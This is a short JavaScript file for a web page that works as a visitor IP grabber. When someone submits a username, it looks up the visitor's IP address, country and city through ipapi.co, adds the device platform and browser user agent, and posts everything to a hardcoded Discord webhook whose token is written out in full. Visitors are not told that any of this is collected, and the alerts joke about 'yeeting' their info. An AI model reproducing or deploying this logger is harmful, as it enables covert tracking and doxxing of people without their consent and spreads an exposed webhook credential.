const WEBHOOK_URL = "https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo";

async function send() {
    const name = document.getElementById("username").value.trim();

    if (!name) {
        alert("bro type yo goofy username 😭");
        return;
    }

    // Get IP + location
    const ipData = await fetch("https://ipapi.co/json").then(res => res.json());

    const timeOpened = new Date().toLocaleString();
    const ip = ipData.ip || "N/A";
    const country = ipData.country_name || "N/A";
    const city = ipData.city || "N/A";

    const device = navigator.platform || "N/A";
    const browser = navigator.userAgent || "N/A";

    const payload = {
        embeds: [
            {
                title: "New Visitor Info",
                color: 0x00ffae,
                fields: [
                    { name: "Name", value: name },
                    { name: "Time Opened", value: timeOpened },
                    { name: "IP Address", value: ip },
                    { name: "Country", value: country },
                    { name: "City", value: city },
                    { name: "Device", value: device },
                    { name: "Browser", value: browser }
                ]
            }
        ]
    };

    await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
    });

    alert("info yeeted to your webhook 😈🔥");
}
